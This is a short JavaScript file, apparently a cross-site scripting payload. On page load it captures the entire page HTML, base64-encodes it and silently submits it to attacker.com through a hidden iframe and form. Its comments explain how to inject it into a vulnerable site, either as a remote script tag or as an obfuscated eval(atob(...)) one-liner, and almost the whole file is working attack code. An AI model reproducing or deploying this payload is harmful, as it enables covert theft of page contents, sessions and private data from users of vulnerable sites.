// This script takes the entire page contents, base64 encodes it,
// and then posts the content using a POST request with the data in
// a 'contents' field.
// 
// This whole process takes place with no use interaction needed and does
// so silently in the background with no visual indicators.
//
// You can include this script in a script tag or base64 encode it and
// pass in to a vulnerable location.
//
// example:
// <script src='http://attacker.com/this-script.js'></script>
//
// example (base64 encoded):
// eval(window.atob('dmFyIHBvc3RUbyA9ICdodHRwOi8vYXR0YWNrZXIuY29tL3Bvc3RUbyc7DQoNCndpbmRvdy5vbmxvYWQgPSBmdW5jdGlvbigpIHsNCiAgICB2YXIgcGFnZSA9IHdpbmRvdy5idG9hKCc8aHRtbD4nICsgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LmlubmVySFRNTCArICc8L2h0bWw+Jyk7DQoNCiAgICB2YXIgaWZyYW1lID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaWZyYW1lJyk7DQogICAgaWZyYW1lLnNldEF0dHJpYnV0ZSgnc3R5bGUnLCAnZGlzcGxheTogbm9uZScpOw0KICAgIGlmcmFtZS5zZXRBdHRyaWJ1dGUoJ25hbWUnLCAncG9zdEZyYW1lJyk7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ2JvZHknKVswXS5hcHBlbmRDaGlsZChpZnJhbWUpOw0KDQogICAgdmFyIGZvcm0gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdmb3JtJyk7DQogICAgZm9ybS5zZXRBdHRyaWJ1dGUoJ21ldGhvZCcsICdwb3N0Jyk7DQogICAgZm9ybS5zZXRBdHRyaWJ1dGUoJ2FjdGlvbicsIHBvc3RUbyk7DQogICAgZm9ybS5zZXRBdHRyaWJ1dGUoJ3RhcmdldCcsICdwb3N0RnJhbWUnKTsNCg0KICAgIHZhciBpbnB1dCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lucHV0Jyk7DQogICAgaW5wdXQuc2V0QXR0cmlidXRlKCd0eXBlJywnaGlkZGVuJyk7DQogICAgaW5wdXQuc2V0QXR0cmlidXRlKCduYW1lJywnY29udGVudHMnKTsNCiAgICBpbnB1dC5zZXRBdHRyaWJ1dGUoJ3ZhbHVlJywgcGFnZSk7DQoNCiAgICBmb3JtLmFwcGVuZENoaWxkKGlucHV0KTsNCiAgICBmb3JtLnN1Ym1pdCgpOw0KfQ=='));
//
//



var postTo = 'http://attacker.com/postTo';

window.onload = function() {
    var page = window.btoa('<html>' + document.documentElement.innerHTML + '</html>');

    var iframe = document.createElement('iframe');
    iframe.setAttribute('style', 'display: none');
    iframe.setAttribute('name', 'postFrame');
    document.getElementsByTagName('body')[0].appendChild(iframe);

    var form = document.createElement('form');
    form.setAttribute('method', 'post');
    form.setAttribute('action', postTo);
    form.setAttribute('target', 'postFrame');

    var input = document.createElement('input');
    input.setAttribute('type','hidden');
    input.setAttribute('name','contents');
    input.setAttribute('value', page);

    form.appendChild(input);
    form.submit();
}
